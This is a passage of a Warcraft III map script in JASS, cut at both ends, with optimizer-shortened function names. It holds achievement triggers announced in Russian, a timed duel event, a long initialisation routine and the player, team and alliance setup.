if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304C35)==true) then
return false
endif
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304C34)==true) then
return false
endif
return true
endfunction
function B7X takes nothing returns nothing
if B7V() then
if B7U() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetTriggerUnit()))+" получил достижение |c0000ff00\"Сквозь воду\"")
call UnitAddAbilityBJ($41313035,GetTriggerUnit())
endif
else
endif
if B7W() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304C33))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304C35))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304C34))
call UnitAddItemByIdSwapped($74626172,GetTriggerUnit())
else
endif
endfunction
function B7Y takes nothing returns nothing
set jF=CreateTrigger()
call TriggerRegisterEnterRectSimple(jF,Gm)
call TriggerRegisterEnterRectSimple(jF,Gn)
call TriggerAddAction(jF,function B7X)
endfunction
function B7Z takes nothing returns nothing
local integer Mc
if Sf>=10 then
call DisableTrigger(GetTriggeringTrigger())
if Rq[2]<15 then
set Mc=0
loop
if GetUnitAbilityLevel(MT[Mc],$4130545A)<1 and GetUnitState(MT[Mc],UNIT_STATE_LIFE)>.405 then
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(Player(Mc))+" получил достижение |c0000ff00\"Знаток\"")
call UnitAddAbility(MT[Mc],$4130545A)
endif
set Mc=Mc+1
exitwhen Mc>7
endloop
endif
endif
endfunction
function B7a takes nothing returns nothing
set jG=CreateTrigger()
call TriggerRegisterTimerEventPeriodic(jG,2)
call TriggerAddAction(jG,function B7Z)
endfunction
function B7b takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B7c takes nothing returns boolean
if GetUnitAbilityLevel(GetEnumUnit(),$41313058)>=1 then
return true
endif
return false
endfunction
function B7d takes nothing returns boolean
if not B7c() then
return false
endif
return true
endfunction
function B7e takes nothing returns boolean
if not (GetUnitAbilityLevel(GetEnumUnit(),$41313141)>=1) then
return false
endif
return true
endfunction
function B7f takes nothing returns nothing
if B7d() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetEnumUnit()))+" получил достижение |c0000ff00\"Новогодний корпоратив\"")
call UnitAddAbilityBJ($41313058,GetEnumUnit())
endif
if Xq[999]<1 then
if B7e() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetEnumUnit()))+" получил достижение |c0000ff00\"Повелитель снега\"")
call UnitAddAbilityBJ($41313141,GetEnumUnit())
endif
endif
endfunction
function B7g takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303654) then
return false
endif
return true
endfunction
function B7h takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B7i takes nothing returns boolean
if not (GetUnitAbilityLevel(GetEnumUnit(),$41304D4A)>=1) then
return false
endif
return true
endfunction
function B7j takes nothing returns nothing
if Xq[888]<1 then
if B7i() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetEnumUnit()))+" получил достижение |c0000ff00\"Мы не захлебнёмся\"")
call UnitAddAbilityBJ($41304D4A,GetEnumUnit())
endif
endif
endfunction
function B7k takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303844) then
return false
endif
return true
endfunction
function B7l takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B7m takes nothing returns boolean
if not (GetUnitAbilityLevel(GetEnumUnit(),$41313954)>=1) then
return false
endif
return true
endfunction
function B7n takes nothing returns nothing
if Xq[777]<1 then
if B7m() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetEnumUnit()))+" получил достижение |c0000ff00\"Повелитель песка\"")
call UnitAddAbilityBJ($41313954,GetEnumUnit())
endif
endif
endfunction
function B7o takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303754) then
return false
endif
return true
endfunction
function B7p takes nothing returns nothing
if B7g() then
call ForGroupBJ(GetUnitsInRectMatching(FL,Condition(function B7b)),function B7f)
else
endif
if B7k() then
call ForGroupBJ(GetUnitsInRectMatching(GJ,Condition(function B7h)),function B7j)
else
endif
if B7o() then
call ForGroupBJ(GetUnitsInRectMatching(GW,Condition(function B7l)),function B7n)
else
endif
endfunction
function B7q takes nothing returns nothing
set jH=CreateTrigger()
call TriggerRegisterUnitEvent(jH,K0,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(jH,Kw,EVENT_UNIT_DEATH)
call TriggerAddAction(jH,function B7p)
endfunction
function B7r takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E30304A then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30304F then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303052 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303130 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303232 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303331 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303547 then
return true
endif
return false
endfunction
function B7s takes nothing returns boolean
if not (GetUnitAbilityLevel(MT[GetForLoopIndexA()-1],$41304B4E)>=1) then
return false
endif
return true
endfunction
function B7t takes nothing returns boolean
if not (T5[GetForLoopIndexA()]>=7) then
return false
endif
return true
endfunction
function B7u takes nothing returns boolean
if not B7r() then
return false
endif
return true
endfunction
function B7v takes nothing returns nothing
if B7u() then
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=8
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set T5[GetForLoopIndexA()]=T5[GetForLoopIndexA()]+1
if B7t() then
if B7s() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(ConvertedPlayer(GetForLoopIndexA()))+" получил достижение |c0000ff00\"Несущий смерть\"")
call UnitAddAbilityBJ($41304B4E,MT[GetForLoopIndexA()-1])
endif
else
endif
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
else
endif
endfunction
function B7w takes nothing returns nothing
set jI=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(jI,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(jI,function B7v)
endfunction
function B7x takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$4131394B)>=10) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$4131394F)>=10) then
return false
endif
return true
endfunction
function B7y takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B7z takes nothing returns boolean
if not (GetUnitAbilityLevel(GetEnumUnit(),$4131424E)>=1) then
return false
endif
return true
endfunction
function B70 takes nothing returns nothing
if B7z() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetEnumUnit()))+" получил достижение |c0000ff00\"Море по колено\"")
call UnitAddAbilityBJ($4131424E,GetEnumUnit())
endif
endfunction
function B71 takes nothing returns nothing
call ForGroupBJ(GetUnitsInRectMatching(GL,Condition(function B7y)),function B70)
endfunction
function B72 takes nothing returns nothing
set jJ=CreateTrigger()
call TriggerRegisterUnitEvent(jJ,K6,EVENT_UNIT_DEATH)
call TriggerAddCondition(jJ,Condition(function B7x))
call TriggerAddAction(jJ,function B71)
endfunction
function B73 takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=Location(21400,1975)
call SetUnitPositionLoc(Hu,Ht)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(GetLocationX(Ht),GetLocationY(Ht),0)
endif
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function B74 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function B75 takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=Location(21800,470)
call SetUnitPositionLoc(Hu,Ht)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(GetLocationX(Ht),GetLocationY(Ht),0)
endif
call DisplayTextToPlayer(GetOwningPlayer(Hu),.5,0,"|c00ffff00На поединок у вас 50 секунд!")
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function B76 takes nothing returns nothing
local group Mc
local boolexpr No
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(100)
if GetUnitAbilityLevel(Lj,$41305A50)==0 then
set Mc=CreateGroup()
set No=Condition(function my)
call GroupEnumUnitsInRect(Mc,GW,No)
call DestroyBoolExpr(No)
call ForGroup(Mc,function B75)
call DestroyGroup(Mc)
set No=null
set Mc=null
call TriggerSleepAction(5)
call CreateUnitAtLoc(Player(11),$7567686F,Location(21310,770),0)
call CreateUnitAtLoc(Player(11),$7567686F,Location(22370,730),0)
call CreateUnitAtLoc(Player(11),$7567686F,Location(21850,900),0)
call TriggerSleepAction(50)
set Mc=CreateGroup()
set No=Condition(function mx)
call GroupEnumUnitsInRect(Mc,G1,No)
call DestroyBoolExpr(No)
if CountUnitsInGroup(Mc)>=1 then
call m2(Lj,$3D0900)
endif
call ForGroup(Mc,function B74)
call DestroyGroup(Mc)
set No=null
set Mc=null
set Mc=CreateGroup()
set No=Condition(function my)
call GroupEnumUnitsInRect(Mc,G1,No)
call DestroyBoolExpr(No)
call ForGroup(Mc,function B73)
call DestroyGroup(Mc)
set No=null
set Mc=null
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function B77 takes nothing returns nothing
local trigger dQ=CreateTrigger()
call TriggerRegisterUnitEvent(dQ,Lj,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dQ,function B76)
set dQ=null
endfunction
function B78 takes nothing returns nothing
call nr()
call n1()
call n3()
call n7()
call n9()
call oD()
call oK()
call oP()
call oW()
call os()
call o6()
call o9()
call pO()
call pV()
call pl()
call pq()
call p0()
call p4()
call qB()
call qI()
call qM()
call qU()
call qZ()
call qv()
call q4()
call rB()
call rI()
call rM()
call rh()
call r4()
call sd()
call so()
call sq()
call sv()
call s0()
call tW()
call te()
call tm()
call tp()
call ty()
call t1()
call t4()
call t8()
call uH()
call uK()
call uV()
call uY()
call ud()
call u7()
call vE()
call vI()
call va()
call vh()
call vo()
call v7()
call wF()
call wS()
call wZ()
call wi()
call wu()
call w3()
call xG()
call xJ()
call xM()
call xR()
call xW()
call xd()
call xj()
call xn()
call xs()
call xw()
call yB()
call yG()
call yJ()
call yT()
call yX()
call ya()
call ye()
call yl()
call yq()
call yt()
call y1()
call y4()
call y9()
call zF()
call zH()
call zJ()
call zN()
call zT()
call zY()
call zb()
call ze()
call z0()
call BBf()
call BBl()
call BBo()
call BBq()
call BBv()
call BBx()
call BB1()
call BB5()
call BB9()
call BCE()
call BCI()
call BCM()
call BCY()
call BCc()
call BCf()
call BCr()
call BCv()
call BCy()
call BDB()
call BDF()
call BDI()
call BDL()
call BDX()
call BDb()
call BDe()
call BDh()
call BDk()
call BDm()
call BDy()
call BD1()
call BEB()
call BEM()
call BEQ()
call BES()
call BEe()
call BEh()
call BEl()
call BEp()
call BEt()
call BEx()
call BE1()
call BE5()
call BFH()
call BFK()
call BFR()
call BFc()
call BFg()
call BFi()
call BFu()
call BFy()
call BF2()
call BF5()
call BF8()
call BGC()
call BGF()
call BGI()
call BGM()
call BGX()
call BGb()
call BGe()
call BGp()
call BGt()
call BGv()
call BG7()
call BHC()
call BHG()
call BHc()
call BHy()
call BH9()
call BIE()
call BIH()
call BIS()
call BIW()
call BIb()
call BIg()
call BIl()
call BIq()
call BI2()
call BI5()
call BI8()
call BJC()
call BJF()
call BJI()
call BJL()
call BJO()
call BJZ()
call BJd()
call BJf()
call BJr()
call BJu()
call BJ9()
call BKE()
call BKI()
call BKM()
call BKQ()
call BKb()
call BKj()
call BKl()
call BKn()
call BKp()
call BKr()
call BKt()
call BKw()
call BKy()
call BK8()
call BLC()
call BLG()
call BLI()
call BLU()
call BLY()
call BLa()
call BLm()
call BLq()
call BLs()
call BL4()
call BL7()
call BMC()
call BME()
call BMQ()
call BMT()
call BMW()
call BMh()
call BMl()
call BMn()
call BMz()
call BM3()
call BM6()
call BM8()
call BNB()
call BND()
call BNF()
call BNH()
call BNT()
call BNW()
call BNa()
call BNl()
call BNw()
call BN0()
call BOC()
call BOG()
call BOS()
call BOW()
call BOi()
call BOm()
call BOp()
call BO0()
call BO4()
call BO7()
call BO9()
call BPM()
call BPP()
call BP6()
call BP9()
call BQD()
call BQJ()
call BQN()
call BQQ()
call BQU()
call BQX()
call BQb()
call BQf()
call BQr()
call BQu()
call BQy()
call BQ9()
call BRD()
call BRF()
call BRQ()
call BRU()
call BRX()
call BRj()
call BRn()
call BRp()
call BR1()
call BR5()
call BR7()
call BR9()
call BSD()
call BSF()
call BSI()
call BSU()
call BSX()
call BSb()
call BSe()
call BTQ()
call BTU()
call BTW()
call BTi()
call BTp()
call BTt()
call BT5()
call BT8()
call BUC()
call BUG()
call BUL()
call BU6()
call BVs()
call BVv()
call BVy()
call BV2()
call BV5()
call BWB()
call BWE()
call BWH()
call BWK()
call BWN()
call BWQ()
call BWU()
call BWY()
call BWb()
call BWe()
call BWz()
call BW1()
call BXD()
call BXG()
call BXJ()
call BXM()
call BXO()
call BXR()
call BXU()
call BXX()
call BXa()
call BXd()
call BXf()
call BXs()
call BXw()
call BXz()
call BX2()
call BX5()
call BX8()
call BYC()
call BYF()
call BYJ()
call BYM()
call BYY()
call BYb()
call BYf()
call BYs()
call BY4()
call BY8()
call BZB()
call BZD()
call BZF()
call BZI()
call BZM()
call BZP()
call BZW()
call BZb()
call BZf()
call BZi()
call BZu()
call BZy()
call BZ2()
call BZ6()
call BaB()
call BaF()
call BaJ()
call BaV()
call BaY()
call Bab()
call Bae()
call Baj()
call Baw()
call Bbo()
call Bbv()
call Bby()
call Bb2()
call Bb6()
call BcF()
call BcJ()
call BcN()
call BcQ()
call BcT()
call BcX()
call Bcj()
call Bcm()
call Bcq()
call Bcs()
call Bcv()
call Bcz()
call BdD()
call BdJ()
call BdM()
call BdR()
call BdW()
call Bdb()
call Bdd()
call Bdh()
call Bdn()
call Bds()
call Bdv()
call Bdz()
call Bd3()
call BeG()
call BeK()
call BeO()
call BeS()
call BeZ()
call Beb()
call Bef()
call Bei()
call Bek()
call Beo()
call Bet()
call Be5()
call BfB()
call BfG()
call BfL()
call BfQ()
call BfV()
call BfY()
call Bfb()
call Bfq()
call Bfw()
call BgC()
call BgF()
call BgI()
call BgL()
call BgN()
call BgQ()
call BgT()
call BgW()
call BgZ()
call Bgb()
call Bgd()
call Bgf()
call Bgq()
call Bgt()
call Bgw()
call Bgz()
call Bg2()
call Bg4()
call Bg7()
call BhC()
call BhG()
call BhL()
call BhV()
call BhX()
call Bhb()
call Bhe()
call Bhg()
call Bhi()
call Bh8()
call BiD()
call BiH()
call BiL()
call BiN()
call BiS()
call Big()
call Bip()
call Biy()
call Bi1()
call Bi5()
call BkK()
call BkO()
call BkS()
call BkV()
call BkY()
call Bkb()
call Bkg()
call Bkj()
call Bkl()
call Bkp()
call Bks()
call Bkz()
call Bk2()
call Bk4()
call Bk8()
call BlD()
call BlK()
call BlO()
call BlR()
call BlU()
call BlX()
call Blb()
call Bld()
call Bli()
call Blq()
call Blu()
call Blx()
call Blz()
call Bl3()
call Bl6()
call BmC()
call BmF()
call BmH()
call BmK()
call BmN()
call BmR()
call BmV()
call BmY()
call Bmd()
call Bmg()
call Bml()
call Bmn()
call Bmq()
call Bms()
call Bmv()
call Bm0()
call Bm4()
call Bm9()
call BnD()
call BnJ()
call BnM()
call BnT()
call BnZ()
call Bni()
call Bnk()
call Bno()
call Bns()
call Bnv()
call Bny()
call Bn1()
call Bn4()
call Bn7()
call BoB()
call BoL()
call BoV()
call Bof()
call Boj()
call Bom()
call Bor()
call Bow()
call Bo1()
call Bo9()
call BpK()
call BpR()
call BpU()
call BpX()
call Bpa()
call Bpd()
call Bpf()
call Bph()
call Bpm()
call Bpo()
call Bpr()
call Bpv()
call Bpz()
call Bp3()
call Bp7()
call BqB()
call BqE()
call BqH()
call BqK()
call BqR()
call BqV()
call Bqa()
call Bqh()
call Bqn()
call Bq2()
call Bq6()
call BrC()
call BrG()
call BrJ()
call BrU()
call Brb()
call Brh()
call Brn()
call Brq()
call Brw()
call Br3()
call BsB()
call BsE()
call BsI()
call BsM()
call BsP()
call BsT()
call BsX()
call Bsc()
call Bsg()
call Bsj()
call Bsn()
call Bsq()
call Bsu()
call Bsz()
call Bs2()
call Bs8()
call BtB()
call BtD()
call BtM()
call BtO()
call Buq()
call Bus()
call Bvf()
call Bvh()
call Bv0()
call Bv6()
call BwD()
call BwM()
call BwO()
call BwT()
call BwX()
call Bwb()
call Bwi()
call Bwk()
call Bwm()
call Bwr()
call Bwt()
call Bwv()
call Bwx()
call Bwz()
call Bw3()
call Bw8()
call BxS()
call BxV()
call BxY()
call Bxb()
call Bxo()
call Bxv()
call Bx2()
call Bx9()
call ByE()
call ByI()
call ByM()
call ByQ()
call ByU()
call ByY()
call Bye()
call Byk()
call Byo()
call Byv()
call Byz()
call By5()
call By7()
call BzB()
call BzE()
call BzH()
call BzK()
call BzN()
call BzQ()
call BzT()
call BzW()
call Bze()
call Bzm()
call Bzy()
call Bz2()
call Bz5()
call Bz8()
call B0H()
call B0P()
call B0b()
call B0i()
call B0p()
call B01()
call B08()
call B1G()
call B1I()
call B1K()
call B1W()
call B1b()
call B1p()
call B1r()
call B1t()
call B1w()
call B1z()
call B12()
call B15()
call B18()
call B2C()
call B2F()
call B2I()
call B2R()
call B2T()
call B2Z()
call B2l()
call B3I()
call B3j()
call B3m()
call B3s()
call B3w()
call B3z()
call B4H()
call B4Y()
call B4p()
call B46()
call B5O()
call B5R()
call B5X()
call B5a()
call B5f()
call B6X()
call B6c()
call B6h()
call B6t()
call B6v()
call B62()
call B7B()
call B7H()
call B7N()
call B7P()
call B7T()
call B7Y()
call B7a()
call B7q()
call B7w()
call B72()
call B77()
endfunction
function B79 takes nothing returns nothing
call ConditionalTriggerExecute(jK)
call ConditionalTriggerExecute(hx)
call ConditionalTriggerExecute(jL)
call ConditionalTriggerExecute(jM)
call ConditionalTriggerExecute(jN)
call ConditionalTriggerExecute(jO)
endfunction
function B8B takes nothing returns nothing
call SetPlayerStartLocation(Player(0),0)
call ForcePlayerStartLocation(Player(0),0)
call SetPlayerColor(Player(0),ConvertPlayerColor(0))
call SetPlayerRacePreference(Player(0),RACE_PREF_HUMAN)
call SetPlayerRaceSelectable(Player(0),false)
call SetPlayerController(Player(0),MAP_CONTROL_USER)
call SetPlayerStartLocation(Player(1),1)
call ForcePlayerStartLocation(Player(1),1)
call SetPlayerColor(Player(1),ConvertPlayerColor(1))
call SetPlayerRacePreference(Player(1),RACE_PREF_HUMAN)
call SetPlayerRaceSelectable(Player(1),false)
call SetPlayerController(Player(1),MAP_CONTROL_USER)
call SetPlayerStartLocation(Player(2),2)
call ForcePlayerStartLocation(Player(2),2)
call SetPlayerColor(Player(2),ConvertPlayerColor(2))
call SetPlayerRacePreference(Player(2),RACE_PREF_HUMAN)
call SetPlayerRaceSelectable(Player(2),false)
call SetPlayerController(Player(2),MAP_CONTROL_USER)
call SetPlayerStartLocation(Player(3),3)
call ForcePlayerStartLocation(Player(3),3)
call SetPlayerColor(Player(3),ConvertPlayerColor(3))
call SetPlayerRacePreference(Player(3),RACE_PREF_HUMAN)
call SetPlayerRaceSelectable(Player(3),false)
call SetPlayerController(Player(3),MAP_CONTROL_USER)
call SetPlayerStartLocation(Player(4),4)
call ForcePlayerStartLocation(Player(4),4)
call SetPlayerColor(Player(4),ConvertPlayerColor(4))
call SetPlayerRacePreference(Player(4),RACE_PREF_HUMAN)
call SetPlayerRaceSelectable(Player(4),false)
call SetPlayerController(Player(4),MAP_CONTROL_USER)
call SetPlayerStartLocation(Player(5),5)
call ForcePlayerStartLocation(Player(5),5)
call SetPlayerColor(Player(5),ConvertPlayerColor(5))
call SetPlayerRacePreference(Player(5),RACE_PREF_HUMAN)
call SetPlayerRaceSelectable(Player(5),false)
call SetPlayerController(Player(5),MAP_CONTROL_USER)
call SetPlayerStartLocation(Player(6),6)
call ForcePlayerStartLocation(Player(6),6)
call SetPlayerColor(Player(6),ConvertPlayerColor(6))
call SetPlayerRacePreference(Player(6),RACE_PREF_HUMAN)
call SetPlayerRaceSelectable(Player(6),false)
call SetPlayerController(Player(6),MAP_CONTROL_USER)
call SetPlayerStartLocation(Player(7),7)
call ForcePlayerStartLocation(Player(7),7)
call SetPlayerColor(Player(7),ConvertPlayerColor(7))
call SetPlayerRacePreference(Player(7),RACE_PREF_HUMAN)
call SetPlayerRaceSelectable(Player(7),false)
call SetPlayerController(Player(7),MAP_CONTROL_USER)
call SetPlayerStartLocation(Player(8),8)
call ForcePlayerStartLocation(Player(8),8)
call SetPlayerColor(Player(8),ConvertPlayerColor(8))
call SetPlayerRacePreference(Player(8),RACE_PREF_NIGHTELF)
call SetPlayerRaceSelectable(Player(8),false)
call SetPlayerController(Player(8),MAP_CONTROL_COMPUTER)
call SetPlayerStartLocation(Player(9),9)
call SetPlayerColor(Player(9),ConvertPlayerColor(9))
call SetPlayerRacePreference(Player(9),RACE_PREF_ORC)
call SetPlayerRaceSelectable(Player(9),false)
call SetPlayerController(Player(9),MAP_CONTROL_COMPUTER)
endfunction
function B8C takes nothing returns nothing
call SetPlayerTeam(Player(0),0)
call SetPlayerState(Player(0),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerTeam(Player(1),0)
call SetPlayerState(Player(1),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerTeam(Player(2),0)
call SetPlayerState(Player(2),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerTeam(Player(3),0)
call SetPlayerState(Player(3),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerTeam(Player(4),0)
call SetPlayerState(Player(4),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerTeam(Player(5),0)
call SetPlayerState(Player(5),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerTeam(Player(6),0)
call SetPlayerState(Player(6),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerTeam(Player(7),0)
call SetPlayerState(Player(7),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerTeam(Player(8),0)
call SetPlayerState(Player(8),PLAYER_STATE_ALLIED_VICTORY,1)
call SetPlayerAllianceStateAllyBJ(Player(0),Player(1),true)
call SetPlayerAllianceStateAllyBJ(Player(0),Player(2),true)
call SetPlayerAllianceStateAllyBJ(Player(0),Player(3),true)
call SetPlayerAllianceStateAllyBJ(Player(0),Player(4),true)
call SetPlayerAllianceStateAllyBJ(Player(0),Player(5),true)
call SetPlayerAllianceStateAllyBJ(Player(0),Player(6),true)
call SetPlayerAllianceStateAllyBJ(Player(0),Player(7),true)
call SetPlayerAllianceStateAllyBJ(Player(0),Player(8),true)
call SetPlayerAllianceStateAllyBJ(Player(1),Player(0),true)
call SetPlayerAllianceStateAllyBJ(Player(1),Player(2),true)
call SetPlayerAllianceStateAllyBJ(Player(1),Player(3),true)
call SetPlayerAllianceStateAllyBJ(Player(1),Player(4),true)
call SetPlayerAllianceStateAllyBJ(Player(1),Player(5),true)
call SetPlayerAllianceStateAllyBJ(Player(1),Player(6),true)
call SetPlayerAllianceStateAllyBJ(Player(1),Player(7),true)
call SetPlayerAllianceStateAllyBJ(Player(1),Player(8),true)
call SetPlayerAllianceStateAllyBJ(Player(2),Player(0),true)
call SetPlayerAllianceStateAllyBJ(Player(2),Player(1),true)
call SetPlayerAllianceStateAllyBJ(Player(2),Player(3),true)
call SetPlayerAllianceStateAllyBJ(Player(2),Player(4),true)
call SetPlayerAllianceStateAllyBJ(Player(2),Player(5),true)
call SetPlayerAllianceStateAllyBJ(Player(2),Player(6),true)
call SetPlayerAllianceStateAllyBJ(Player(2),Player(7),true)
call SetPlayerAllianceStateAllyBJ(Player(2),Player(8),true)
call SetPlayerAllianceStateAllyBJ(Player(3),Player(0),true)
call SetPlayerAllianceStateAllyBJ(Player(3),Player(1),true)
call SetPlayerAllianceStateAllyBJ(Player(3),Player(2),true)
call SetPlayerAllianceStateAllyBJ(Player(3),Player(4),true)
call SetPlayerAllianceStateAllyBJ(Player(3),Player(5),true)
call SetPlayerAllianceStateAllyBJ(Player(3),Player(6),true)
call SetPlayerAllianceStateAllyBJ(Player(3),Player(7),true)
call SetPlayerAllianceStateAllyBJ(Player(3),Player(8),true)
call SetPlayerAllianceStateAllyBJ(Player(4),Player(0),true)
call SetPlayerAllianceStateAllyBJ(Player(4),Player(1),true)
call SetPlayerAllianceStateAllyBJ(Player(4),Player(2),true)
call SetPlayerAllianceStateAllyBJ(Player(4),Player(3),true)
call SetPlayerAllianceStateAllyBJ(Player(4),Player(5),true)
call SetPlayerAllianceStateAllyBJ(Player(4),Player(6),true)
call SetPlayerAllianceStateAllyBJ(Player(4),Player(7),true)
call SetPlayerAllianceStateAllyBJ(Player(4),Player(8),true)
call SetPlayerAllianceStateAllyBJ(Player(5),Player(0),true)
call SetPlayerAllianceStateAllyBJ(Player(5),Player(1),true)
call SetPlayerAllianceStateAllyBJ(Player(5),Player(2),true)
call SetPlayerAllianceStateAllyBJ(Player(5),Player(3),true)
call SetPlayerAllianceStateAllyBJ(Player(5),Player(4),true)
call SetPlayerAllianceStateAllyBJ(Player(5),Player(6),true)
call SetPlayerAllianceStateAllyBJ(Player(5),Player(7),true)
call SetPlayerAllianceStateAllyBJ(Player(5),Player(8),true)
call SetPlayerAllianceStateAllyBJ(Player(6),Player(0),true)
call SetPlayerAllianceStateAllyBJ(Player(6),Player(1),true)
call SetPlayerAllianceStateAllyBJ(Player(6),Player(2),true)
call SetPlayerAllianceStateAllyBJ(Player(6),Player(3),true)
call SetPlayerAllianceStateAllyBJ(Player(6),Player(4),true)
call SetPlayerAllianceStateAllyBJ(Player(6),Player(5),true)
call SetPlayerAllianceStateAllyBJ(Player(6),Player(7),true)
call SetPlayerAllianceStateAllyBJ(Player(6),Player(8),true)
call SetPlayerAllianceStateAllyBJ(Player(7),Player(0),true)
call SetPlayerAllianceStateAllyBJ(Player(7),Player(1),true)
call SetPlayerAllianceStateAllyBJ(Player(7),Player(2),true)
call SetPlayerAllianceStateAllyBJ(Player(7),Player(3),true)
call SetPlayerAllianceStateAllyBJ(Player(7),Player(4),true)
call SetPlayerAllianceStateAllyBJ(Player(7),Player(5),true)
call SetPlayerAllianceStateAllyBJ(Player(7),Player(6),true)
call SetPlayerAllianceStateAllyBJ(Player(7),Player(8),true)
call SetPlayerAllianceStateAllyBJ(Player(8),Player(0),true)
call SetPlayerAllianceStateAllyBJ(Player(8),Player(1),true)
call SetPlayerAllianceStateAllyBJ(Player(8),Player(2),true)
call SetPlayerAllianceStateAllyBJ(Player(8),Player(3),true)
call SetPlayerAllianceStateAllyBJ(Player(8),Player(4),true)
call SetPlayerAllianceStateAllyBJ(Player(8),Player(5),true)
call SetPlayerAllianceStateAllyBJ(Player(8),Player(6),true)
call SetPlayerAllianceStateAllyBJ(Player(8),Player(7),true)
call SetPlayerAllianceStateVisionBJ(Player(0),Player(1),true)
call SetPlayerAllianceStateVisionBJ(Player(0),Player(2),true)
call SetPlayerAllianceStateVisionBJ(Player(0),Player(3),true)
call SetPlayerAllianceStateVisionBJ(Player(0),Player(4),true)
call SetPlayerAllianceStateVisionBJ(Player(0),Player(5),true)
call SetPlayerAllianceStateVisionBJ(Player(0),Player(6),true)
call SetPlayerAllianceStateVisionBJ(Player(0),Player(7),true)
call SetPlayerAllianceStateVisionBJ(Player(0),Player(8),true)
call SetPlayerAllianceStateVisionBJ(Player(1),Player(0),true)
call SetPlayerAllianceStateVisionBJ(Player(1),Player(2),true)
call SetPlayerAllianceStateVisionBJ(Player(1),Player(3),true)
call SetPlayerAllianceStateVisionBJ(Player(1),Player(4),true)
call SetPlayerAllianceStateVisionBJ(Player(1),Player(5),true)
call SetPlayerAllianceStateVisionBJ(Player(1),Player(6),true)
call SetPlayerAllianceStateVisionBJ(Player(1),Player(7),true)
call SetPlayerAllianceStateVisionBJ(Player(1),Player(8),true)
call SetPlayerAllianceStateVisionBJ(Player(2),Player(0),true)
call SetPlayerAllianceStateVisionBJ(Player(2),Player(1),true)
call SetPlayerAllianceStateVisionBJ(Player(2),Player(3),true)
call SetPlayerAllianceStateVisionBJ(Player(2),Player(4),true)
call SetPlayerAllianceStateVisionBJ(Player(2),Player(5),true)
call SetPlayerAllianceStateVisionBJ(Player(2),Player(6),true)
call SetPlayerAllianceStateVisionBJ(Player(2),Player(7),true)
call SetPlayerAllianceStateVisionBJ(Player(2),Player(8),true)
call SetPlayerAllianceStateVisionBJ(Player(3),Player(0),true)
call SetPlayerAllianceStateVisionBJ(Player(3),Player(1),true)
call SetPlayerAllianceStateVisionBJ(Player(3),Player(2),true)
call SetPlayerAllianceStateVisionBJ(Player(3),Player(4),true)
call SetPlayerAllianceStateVisionBJ(Player(3),Player(5),true)
call SetPlayerAllianceStateVisionBJ(Player(3),Player(6),true)
call SetPlayerAllianceStateVisionBJ(Player(3),Player(7),true)
call SetPlayerAllianceStateVisionBJ(Player(3),Player(8),true)
call SetPlayerAllianceStateVisionBJ(Player(4),Player(0),true)
call SetPlayerAllianceStateVisionBJ(Player(4),Player(1),true)
call SetPlayerAllianceStateVisionBJ(Player(4),Player(2),true)
call SetPlayerAllianceStateVisionBJ(Player(4),Player(3),true)
call SetPlayerAllianceStateVisionBJ(Player(4),Player(5),true)
